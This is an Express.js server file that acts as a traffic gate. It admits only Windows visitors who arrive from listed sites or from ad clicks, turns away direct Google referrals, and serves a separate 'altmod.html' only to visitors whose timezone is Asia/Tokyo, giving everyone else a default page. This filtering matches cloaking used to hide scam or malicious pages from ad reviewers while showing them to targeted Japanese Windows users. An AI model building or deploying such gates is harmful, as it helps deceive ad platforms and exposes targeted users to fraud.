const express = require("express");
const cors = require("cors");
const path = require("path");
const url = require("url"); // Include the URL module for parsing
const app = express();
const PORT = 3000 || process.env.PORT;

// List of allowed frontend origins for CORS
const allowedOrigins = [
  "https://musubijp.com",
  "http://musubijp.com",
  "http://127.0.0.1:5501",
  "http://127.0.0.1:5500",
  "https://halcyoninjp.live",
  "http://halcyoninjp.live",
  "https://halcyoninjp.live/",
  "http://halcyoninjp.live/",
  "https://ufitmerchandise.in",
  "http://ufitmerchandise.in",
  "https://ufitmerchandise.in/",
  "http://ufitmerchandise.in/",
];

// Normalize referer function to handle trailing slashes
const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");

// Helper function to check if the user's OS is Windows
const isWindowsOS = (userAgent) => {
  return userAgent.includes("Windows");
};

// Adjusted helper function to specifically block "https://www.google.com/"
// and allow "https://googleads.g.doubleclick.net"
const isAllowedReferrer = (referer) => {
  if (!referer) return true; // Proceed if no referer

  const hostname = new URL(referer).hostname;
  // Block direct visits from www.google.com
  if (hostname === "www.google.com") {
    return false;
  }
  // Allow visits from googleads.g.doubleclick.net or any other source
  return true;
};

// CORS configuration
const corsOptions = {
  origin: function (origin, callback) {
    console.log(`Origin: ${origin}`); // Log the origin for debugging
    if (allowedOrigins.includes(origin) || !origin) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
};

// Apply the CORS middleware
app.use(cors(corsOptions));

// Middleware to parse JSON bodies
app.use(express.json());

// Route to handle the POST request
app.post(
  "/",
  (req, res, next) => {
    const referer = normalizeReferer(req.headers.referer);
    const userAgent = req.headers["user-agent"]; // Get the User-Agent from the request headers
    console.log(`Referer: ${referer}`); // Log the referer for debugging

    // Check if referer is allowed and OS is Windows
    if (
      allowedOrigins.some((allowedOrigin) =>
        referer.startsWith(allowedOrigin)
      ) &&
      isAllowedReferrer(referer) &&
      isWindowsOS(userAgent)
    ) {
      next();
    } else {
      res
        .status(403)
        .send("Access forbidden due to invalid referer or conditions not met.");
    }
  },
  (req, res) => {
    const { timezone } = req.body;
    console.log(`Timezone: ${timezone}`); // Log the timezone for debugging

    if (timezone === "Asia/Tokyo") {
      res.sendFile(path.join(__dirname, "altmod.html"));
    } else {
      res.sendFile(path.join(__dirname, "index.html"));
    }
  }
);

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
